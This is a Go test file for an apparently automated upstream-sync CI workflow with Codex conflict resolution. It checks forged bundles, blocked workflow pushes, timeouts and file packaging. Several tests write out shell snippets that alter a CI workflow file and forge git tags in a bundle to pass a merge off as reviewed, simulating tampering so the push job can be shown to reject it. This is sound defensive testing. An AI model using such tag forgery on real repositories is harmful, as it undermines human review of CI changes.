	const changeGithub = "echo 'name: other' >.github/workflows/ci.yml\ngit add -A\n"

	t.Run("a tag that passes for main", func(t *testing.T) {
		fork, env := syncRepo(t)
		origin := pushableOrigin(t, fork)
		main := git(t, fork, "rev-parse", "main")
		const tamper = changeGithub + `git commit -q --amend --no-edit
git tag origin/main qqmerge
git bundle create "$RUNNER_TEMP/merged.bundle" refs/heads/qqmerge refs/tags/origin/main ^refs/heads/main
`
		if out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+afterPrepare+"commit_clean\n"+tamper, env...); err != nil {
			t.Fatalf("the sync job failed: %v\n%s", err, out)
		}
		merged := git(t, fork, "rev-parse", "refs/heads/qqmerge")
		dir, _, out, err := pushJob(t, origin, envValue(t, env, "RUNNER_TEMP"), "finalize", "merged.bundle")
		if err == nil || !strings.Contains(out, "a person must review it") {
			t.Errorf("finalize compared the merge with the bundle's tag and not with main: %v\n%s", err, out)
		}
		if got, want := branches(t, origin), "main "+main+"\nqqmerge-failed "+merged; got != want {
			t.Errorf("origin's branches are\n%s\nwant\n%s", got, want)
		}
		if tags := git(t, dir, "tag"); tags != "" {
			t.Errorf("the job with the token took tags from the bundle: %s", tags)
		}
	})

	t.Run("a tag that passes for the merge", func(t *testing.T) {
		fork, env := syncRepo(t)
		origin := pushableOrigin(t, fork)
		main := git(t, fork, "rev-parse", "main")
		// The tag is the merge as it was checked, and the branch a commit on
		// top of it.
		const tamper = "git tag qqmerge refs/heads/qqmerge\n" + changeGithub + `git commit -q -m 'on top of the merge'
git bundle create "$RUNNER_TEMP/merged.bundle" refs/heads/qqmerge refs/tags/qqmerge ^refs/heads/main
`
		if out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+afterPrepare+"commit_clean\n"+tamper, env...); err != nil {
			t.Fatalf("the sync job failed: %v\n%s", err, out)
		}
		_, _, out, err := pushJob(t, origin, envValue(t, env, "RUNNER_TEMP"), "finalize", "merged.bundle")
		if err == nil {
			t.Errorf("finalize took the bundle's tag for the merge:\n%s", out)
		}
		if got := branches(t, origin); got != "main "+main && !strings.HasPrefix(got, "main "+main+"\nqqmerge-failed ") {
			t.Errorf("origin's branches are\n%s\nwant main where it was, and no qqmerge", got)
		}
	})
}

// A workflow's token may not push a change to .github/workflows, so the save
// can fail too. The merge still isn't pushed, and the run says where it is.
func TestSyncSaysWhereAMergeIsThatItCouldNotSaveForReview(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	main := git(t, fork, "rev-parse", "main")
	const change = "echo 'name: other' >.github/workflows/ci.yml\ngit add -A\ngit commit -q --amend --no-edit\ngit bundle create \"$RUNNER_TEMP/merged.bundle\" qqmerge ^main\n"
	if out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+afterPrepare+"commit_clean\n"+change, env...); err != nil {
		t.Fatalf("the sync job failed: %v\n%s", err, out)
	}
	dir, pushEnv := nextJob(t, origin)
	download(t, "push", pushEnv, "merge-result", envValue(t, env, "RUNNER_TEMP"), "merged.bundle")
	const refused = "push() { echo 'refusing to allow a GitHub App to create or update workflow' >&2; return 1; }\n"
	out, err := bashE(t, dir, syncFunctions(t)+refused+"finalize\n", append(pushEnv, "GH_TOKEN=the-push-token")...)
	if err == nil {
		t.Fatalf("finalize succeeded:\n%s", out)
	}
	for _, want := range []string{"a person must review it", "It couldn't be saved to qqmerge-failed; its bundle is in this run's merge-result artifact."} {
		if !strings.Contains(out, want) {
			t.Errorf("finalize didn't say %q:\n%s", want, out)
		}
	}
	if got := branches(t, origin); got != "main "+main {
		t.Errorf("origin's branches are\n%s\nwant main alone, where it was", got)
	}
}

func TestSyncFinalizePushesNothingItCannotFastForward(t *testing.T) {
	requireShell(t)

	t.Run("main moved", func(t *testing.T) {
		fork, env := syncRepo(t)
		origin := pushableOrigin(t, fork)
		out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+afterPrepare+"commit_clean\n", env...)
		if err != nil {
			t.Fatalf("the sync job failed: %v\n%s", err, out)
		}
		// Someone pushes to main between the sync job and the push job.
		other, _ := nextJob(t, origin)
		writeFile(t, filepath.Join(other, "notes.md"), "notes\n")
		git(t, other, "add", "-A")
		git(t, other, "commit", "-q", "-m", "meanwhile")
		git(t, other, "push", "-q", "origin", "main")
		moved := git(t, other, "rev-parse", "main")

		_, _, out, err = pushJob(t, origin, envValue(t, env, "RUNNER_TEMP"), "finalize", "merged.bundle")
		if err == nil || !strings.Contains(out, "main has moved since the merge was made") {
			t.Fatalf("finalize didn't refuse a merge that main can't fast-forward to: %v\n%s", err, out)
		}
		if got := branches(t, origin); got != "main "+moved {
			t.Errorf("origin's branches are\n%s\nwant main alone, at %s", got, moved)
		}
	})

	t.Run("no bundle", func(t *testing.T) {
		fork, _ := syncRepo(t)
		origin := pushableOrigin(t, fork)
		main := git(t, fork, "rev-parse", "main")
		_, _, out, err := pushJob(t, origin, "", "finalize")
		if err == nil || !strings.Contains(out, "left no merge to push") {
			t.Fatalf("finalize didn't fail without a bundle: %v\n%s", err, out)
		}
		if got := branches(t, origin); got != "main "+main {
			t.Errorf("origin's branches are\n%s\nwant main alone", got)
		}
	})
}

// A test run merges a branch of origin, and stops before the push job: the
// merge is left as a patch for the workflow to upload, and nothing is bundled.
func TestSyncTestRunLeavesAPatchAndNoBundle(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	origin := pushableOrigin(t, fork)
	main := git(t, fork, "rev-parse", "main")
	git(t, fork, "fetch", "-q", envValue(t, env, "UPSTREAM_URL"), "main")
	git(t, fork, "push", "-q", "origin", "FETCH_HEAD:refs/heads/try")
	before := branches(t, origin)

	const outputs = "\nUPSTREAM=$(git rev-parse origin/try)\nBASE=$(git merge-base HEAD \"$UPSTREAM\")\n"
	out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+outputs+"commit_clean\n", append(env, "TEST_BRANCH=try")...)
	if err != nil {
		t.Fatalf("the test run failed: %v\n%s", err, out)
	}
	temp := envValue(t, env, "RUNNER_TEMP")
	if patch := readFile(t, filepath.Join(temp, "test-merge.patch")); !strings.Contains(patch, "+var Y = 2") {
		t.Errorf("the patch doesn't hold the merged change:\n%s", patch)
	}
	if _, err := os.Stat(filepath.Join(temp, "merged.bundle")); err == nil {
		t.Error("a test run bundled its merge for the push job")
	}
	if summary := readFile(t, envValue(t, env, "GITHUB_STEP_SUMMARY")); !strings.Contains(summary, "Test run: merged origin/try") {
		t.Errorf("the summary doesn't say this was a test run:\n%s", summary)
	}
	if after := branches(t, origin); after != before {
		t.Errorf("a test run pushed:\n%s", after)
	}
	if head := git(t, fork, "rev-parse", "qqmerge^1"); head != main {
		t.Errorf("the local qqmerge isn't a merge into main: %s", head)
	}
}

// goSeries returns the Go release that the go line of a go.mod names, such as
// "1.25" for "go 1.25.0".
func goSeries(t *testing.T, path string) string {
	t.Helper()
	for _, line := range strings.Split(readFile(t, path), "\n") {
		version, ok := strings.CutPrefix(line, "go ")
		if !ok {
			continue
		}
		parts := strings.Split(strings.TrimSpace(version), ".")
		if len(parts) < 2 {
			t.Fatalf("%s: go %s", path, version)
		}
		return parts[0] + "." + parts[1]
	}
	t.Fatalf("%s has no go line", path)
	return ""
}

// go.mod names the oldest Go the module supports, api/wasm's go.mod names the
// same, and key/uuid keeps a copy of the standard library's uuid behind
// "//go:build !go1.27" for it, whose header says that the copy "lets CI prove
// parity by running the same test vectors against both backends". The test
// job of the CI workflow has to run on that oldest Go as well as on a newer
// one, or no job builds or tests what only that Go builds. It ran on 1.27
// alone.
func TestCITestsTheOldestGoThatGoModSupports(t *testing.T) {
	series := goSeries(t, "go.mod")
	if wasm := goSeries(t, filepath.Join("api", "wasm", "go.mod")); wasm != series {
		t.Errorf("go.mod supports Go %s and api/wasm/go.mod Go %s", series, wasm)
	}
	job := jobBlocks(t, ciWorkflow)["test-matrix"]
	var tested string
	for _, line := range job {
		if entry := strings.TrimSpace(line); strings.HasPrefix(entry, "go-version: [") {
			tested = entry
		}
	}
	if tested == "" {
		t.Fatal("the test job of the CI workflow has no go-version matrix")
	}
	if !strings.Contains(tested, "'"+series+".") {
		t.Errorf("go.mod supports Go %s, and the test job of the CI workflow runs on %s alone", series, tested)
	}
	// An older Go fetches the toolchain that go.mod names and runs that,
	// unless it is told to be the one that runs.
	if !slices.ContainsFunc(job, func(line string) bool { return strings.TrimSpace(line) == "GOTOOLCHAIN: local" }) {
		t.Errorf("the test job of the CI workflow doesn't set GOTOOLCHAIN to local, so every entry of %s tests with the toolchain of go.mod", tested)
	}
}

// minutes returns the timeout-minutes of a job or a step, at the given
// indentation, or 0 if it has none.
func minutes(t *testing.T, block []string, indent int) int {
	t.Helper()
	for _, line := range block {
		value, ok := strings.CutPrefix(strings.TrimSpace(line), "timeout-minutes: ")
		if !ok || indentOf(line) != indent {
			continue
		}
		n, err := strconv.Atoi(value)
		if err != nil {
			t.Fatalf("timeout-minutes: %s: %v", value, err)
		}
		return n
	}
	return 0
}

// A step that runs out of time has failed, and the steps after it bundle the
// attempt for the push job. A job that runs out of time is cancelled: the
// steps that run on failure() don't, nothing is saved to qqmerge-failed, and
// the next scheduled run starts the same merge, and the same Codex pass,
// again. So the step of each job that can take long ends before its job.
func TestSyncStepsThatCanTakeLongEndBeforeTheirJob(t *testing.T) {
	jobs := jobBlocks(t, syncWorkflow)
	for job, command := range map[string]string{
		"sync":   `sync.sh" prepare`,
		"codex":  "openai/codex-action@",
		"verify": `sync.sh" verify`,
	} {
		whole := minutes(t, jobs[job], 4)
		if whole == 0 {
			t.Errorf("the %s job has no timeout", job)
			continue
		}
		found := false
		for _, step := range jobSteps(jobs[job]) {
			if !strings.Contains(stepAction(step), command) {
				continue
			}
			found = true
			if own := minutes(t, step, 8); own == 0 || own >= whole {
				t.Errorf("the step of the %s job that can take long has %d minutes, and its job %d: it has to end, as a failure, before the job is cancelled", job, own, whole)
			}
		}
		if !found {
			t.Errorf("the %s job has no step with %s", job, command)
		}
	}
}

// sync.sh on package: "It commits the merge as Codex left it", and the prompt
// tells Codex that "the workflow stages and commits your changes". The
// repository's .gitignore is "*" with a list of exceptions, and package staged
// with a plain git add -A, so a new file of any other kind that Codex's
// resolution needs (here the data for a test it added) was left out of the
// merge without a word. The verify job then checked a tree that Codex never
// had.
func TestSyncPackagesFilesCodexAddedThatGitignoreNames(t *testing.T) {
	requireShell(t)
	fork, env := syncRepo(t)
	writeFile(t, filepath.Join(fork, ".gitignore"), readFile(t, ".gitignore"))
	git(t, fork, "add", "-A")
	git(t, fork, "commit", "-q", "-m", "the repository's .gitignore")
	origin := pushableOrigin(t, fork)

	forced := append(env, "FORCE_CODEX=true")
	syncJobAsksForCodex(t, fork, forced, plainMerge)
	// What was in the checkout before Codex worked is not Codex's, and
	// neither is what .git holds.
	const before = "merge_translated() { git merge -q --no-commit --no-ff \"$2\"; echo left >'there before.bin'; }\n"
	const codex = `
mkdir -p testdata
echo '{"want": 2}' >'testdata/golden one.json'
printf 'package a\n\nimport _ "embed"\n\n//go:embed testdata/golden one.json\nvar golden []byte\n' >golden_test.go
`
	for name, steps := range map[string]string{
		"the merge":        "package_result\ngit update-ref refs/heads/packaged codex-result\n",
		"a failed attempt": "package_failed\ngit update-ref refs/heads/packaged qqmerge-failed\n",
	} {
		t.Run(name, func(t *testing.T) {
			dir, codexEnv, out, err := codexJob(t, origin, forced, plainMerge+before, codex, steps)
			if err != nil {
				t.Fatalf("the codex job failed: %v\n%s", err, out)
			}
			held := git(t, dir, "ls-tree", "-r", "--name-only", "packaged")
			for _, want := range []string{"golden_test.go", "testdata/golden one.json"} {
				if !slices.Contains(strings.Split(held, "\n"), want) && !strings.Contains(held, `"`+want+`"`) {
					t.Errorf("what was packaged doesn't have %s, which Codex added:\n%s", want, held)
				}
			}
			if strings.Contains(held, "there before") {
				t.Errorf("what was packaged has a file that .gitignore names and Codex didn't add:\n%s", held)
			}
			if summary := readFile(t, envValue(t, codexEnv, "GITHUB_STEP_SUMMARY")); !strings.Contains(summary, "testdata/golden one.json") {
				t.Errorf("the summary doesn't name the file that .gitignore names and the merge has:\n%s", summary)
			}
		})
	}

	// A sync job has no Codex, and stages nothing that .gitignore names:
	// what its checks left in the checkout is not part of the merge.
	clean, cleanEnv := syncRepo(t)
	writeFile(t, filepath.Join(clean, ".gitignore"), readFile(t, ".gitignore"))
	git(t, clean, "add", "-A")
	git(t, clean, "commit", "-q", "-m", "the repository's .gitignore")
	const checks = "checks() { echo left >left-by-the-checks.bin; }\n"
	if out, err := bashE(t, clean, syncFunctions(t)+plainMerge+checks+"prepare\n"+afterPrepare+"commit_clean\n", cleanEnv...); err != nil {
		t.Fatalf("the sync job failed: %v\n%s", err, out)
	}
	if held := git(t, clean, "ls-tree", "-r", "--name-only", "qqmerge"); strings.Contains(held, "left-by-the-checks") {
		t.Errorf("a clean merge has what the checks left behind:\n%s", held)
	}
}

// tokenOrigin gives origin the rule GitHub applies to a push made with a
// workflow's token, which can't be granted the workflows permission: no branch
// may be moved to a commit whose .github/workflows differs from main's.
// TestSyncSaysWhereAMergeIsThatItCouldNotSaveForReview stands on the same rule.
func tokenOrigin(t *testing.T, origin string) {
	t.Helper()
	const hook = `#!/bin/sh
want=$(git rev-parse -q --verify refs/heads/main:.github/workflows)
got=$(git rev-parse -q --verify "$3:.github/workflows")
if [ "$got" != "$want" ]; then
	echo "refusing to allow a GitHub App to create or update workflow without workflows permission" >&2
	exit 1
fi
`
	path := filepath.Join(origin, "hooks", "update")
	writeFile(t, path, hook)
	if err := os.Chmod(path, 0o755); err != nil {
		t.Fatal(err)
	}
}

// upstreamChangesAWorkflow commits a change to a workflow on the upstream that
// env names, on top of what syncRepo left there.
func upstreamChangesAWorkflow(t *testing.T, env []string) {
	t.Helper()
	upstream := envValue(t, env, "UPSTREAM_URL")
	writeFile(t, filepath.Join(upstream, ".github", "workflows", "ci.yml"), "name: upstream's new\n")
	git(t, upstream, "add", "-A")
	git(t, upstream, "commit", "-q", "-m", "upstream changes its workflow")
}

// nextRun runs prepare the way a later run of the workflow does, on a fresh
// checkout of origin, and returns what it wrote to its outputs. The event is
// what started the run: schedule, or workflow_dispatch for a person.
func nextRun(t *testing.T, origin string, env []string, event string) string {
	t.Helper()
	next, nextEnv := nextJob(t, origin)
	nextEnv = append(nextEnv, "UPSTREAM_URL="+envValue(t, env, "UPSTREAM_URL"), "GITHUB_EVENT_NAME="+event)
	if out, err := bashE(t, next, syncFunctions(t)+plainMerge+"prepare\n", nextEnv...); err != nil {
		t.Fatalf("the next run failed: %v\n%s", err, out)
	}
	return readFile(t, envValue(t, nextEnv, "GITHUB_OUTPUT"))
}

// noteOnly fails the test unless origin has main where it was and a
// qqmerge-failed that is a note of an attempt that couldn't be saved: a commit
// on main with main's own files, which the token may push, that names the
// upstream commit.
func noteOnly(t *testing.T, origin, main, upstream string) {
	t.Helper()
	if got := git(t, origin, "rev-parse", "refs/heads/main"); got != main {
		t.Errorf("origin's main is %s, want it where it was, %s", got, main)
	}
	note := git(t, origin, "rev-parse", "-q", "--verify", "refs/heads/qqmerge-failed")
	if got := git(t, origin, "rev-parse", note+"^{tree}"); got != git(t, origin, "rev-parse", main+"^{tree}") {
		t.Errorf("the note on qqmerge-failed doesn't have main's files:\n%s", git(t, origin, "diff", "--stat", main, note))
	}
	if got := git(t, origin, "log", "-1", "--format=%P", note); got != main {
		t.Errorf("the note on qqmerge-failed has the parents %q, want main alone: upstream's commits are no part of it", got)
	}
	if message := git(t, origin, "log", "-1", "--format=%B", note); !strings.Contains(message, "Upstream-Commit: "+upstream) {
		t.Errorf("the note on qqmerge-failed doesn't name the upstream commit %s:\n%s", upstream, message)
	}
}

// sync.sh on hold_for_review: "It is saved the way a failed attempt is, which
// also keeps scheduled runs from making it again until upstream moves." And
// the workflow: "A failed attempt is saved to the qqmerge-failed branch and
// the run fails; scheduled runs then skip that upstream commit until upstream
// moves or someone reruns by hand."
//
// The only record of an attempt was the qqmerge-failed branch, and the push
// job's token can't push a commit that changes .github/workflows. So when the
// merge brought in a workflow change of upstream's, nothing was recorded, and
// every scheduled run made the whole merge again: the checks, and a Codex
// pass too when the merge needed one. The branch is given a note instead.
func TestSyncNotesAnAttemptThatTheTokenCannotSave(t *testing.T) {
	requireShell(t)

	// later checks what the runs after the one that couldn't save do.
	later := func(t *testing.T, origin string, env []string) {
		t.Helper()
		if outputs := nextRun(t, origin, env, "schedule"); !strings.Contains(outputs, "pending=false") {
			t.Errorf("upstream hasn't moved, and the next scheduled run made the merge again:\n%s", outputs)
		}
		if outputs := nextRun(t, origin, env, "workflow_dispatch"); !strings.Contains(outputs, "pending=true") {
			t.Errorf("a run that a person started didn't make the merge again:\n%s", outputs)
		}
		upstream := envValue(t, env, "UPSTREAM_URL")
		writeFile(t, filepath.Join(upstream, "later.go"), formattedGo)
		git(t, upstream, "add", "-A")
		git(t, upstream, "commit", "-q", "-m", "upstream moves")
		if outputs := nextRun(t, origin, env, "schedule"); !strings.Contains(outputs, "pending=true") {
			t.Errorf("upstream has moved, and the next scheduled run didn't make the merge:\n%s", outputs)
		}
	}

	t.Run("a merge held for review", func(t *testing.T) {
		fork, env := syncRepo(t)
		origin := pushableOrigin(t, fork)
		tokenOrigin(t, origin)
		main := git(t, fork, "rev-parse", "main")
		upstreamChangesAWorkflow(t, env)
		upstream := git(t, envValue(t, env, "UPSTREAM_URL"), "rev-parse", "main")

		if out, err := bashE(t, fork, syncFunctions(t)+plainMerge+"prepare\n"+afterPrepare+"commit_clean\n", env...); err != nil {
			t.Fatalf("the sync job failed: %v\n%s", err, out)
		}
		dir, pushEnv, out, err := pushJob(t, origin, envValue(t, env, "RUNNER_TEMP"), "finalize", "merged.bundle")
		if err == nil || !strings.Contains(out, "It couldn't be saved to qqmerge-failed") {
			t.Fatalf("the test's origin took the held merge, or finalize didn't hold it: %v\n%s", err, out)
		}
		noteOnly(t, origin, main, upstream)
		ranNoMergedCode(t, dir, pushEnv, main)
		later(t, origin, env)
	})

	t.Run("a failed attempt", func(t *testing.T) {
		fork, env, origin := conflictingFork(t)
		tokenOrigin(t, origin)
		main := git(t, fork, "rev-parse", "main")
		upstreamChangesAWorkflow(t, env)
		upstream := git(t, envValue(t, env, "UPSTREAM_URL"), "rev-parse", "main")

		// The merge conflicts, Codex is called and its step fails.
		syncJobAsksForCodex(t, fork, env, plainMerge)
		_, codexEnv, out, err := codexJob(t, origin, env, plainMerge, "", "package_failed\n")
		if err != nil {
			t.Fatalf("the codex job couldn't bundle its attempt: %v\n%s", err, out)
		}
		dir, pushEnv, out, err := pushJob(t, origin, envValue(t, codexEnv, "RUNNER_TEMP"), "save_failed", "failed.bundle")
		if err == nil || !strings.Contains(out, "refusing to allow a GitHub App to create or update workflow") {
			t.Fatalf("the test's origin took the failed attempt: %v\n%s", err, out)
		}
		if !strings.Contains(out, "merge-result artifact") {
			t.Errorf("save-failed didn't say where the attempt is that it couldn't save, as finalize does for a held merge:\n%s", out)
		}
		noteOnly(t, origin, main, upstream)
		ranNoMergedCode(t, dir, pushEnv, main)
		later(t, origin, env)
	})

	// An attempt that the token can push is saved as it always was, and is
	// what the next scheduled run goes by.
	t.Run("an attempt that can be saved", func(t *testing.T) {
		fork, env, origin := conflictingFork(t)
		tokenOrigin(t, origin)
		upstream := git(t, envValue(t, env, "UPSTREAM_URL"), "rev-parse", "main")
		syncJobAsksForCodex(t, fork, env, plainMerge)
		_, codexEnv, out, err := codexJob(t, origin, env, plainMerge, "", "package_failed\n")
		if err != nil {
			t.Fatalf("the codex job couldn't bundle its attempt: %v\n%s", err, out)
		}
		if _, _, out, err := pushJob(t, origin, envValue(t, codexEnv, "RUNNER_TEMP"), "save_failed", "failed.bundle"); err != nil {
			t.Fatalf("save-failed: %v\n%s", err, out)
		}
		if got := git(t, origin, "rev-parse", "refs/heads/qqmerge-failed^2"); got != upstream {
			t.Errorf("qqmerge-failed is an attempt to merge %s, want upstream's %s", got, upstream)
		}
		if outputs := nextRun(t, origin, env, "schedule"); !strings.Contains(outputs, "pending=false") {
			t.Errorf("upstream hasn't moved, and the next scheduled run made the failed merge again:\n%s", outputs)
		}
	})
}
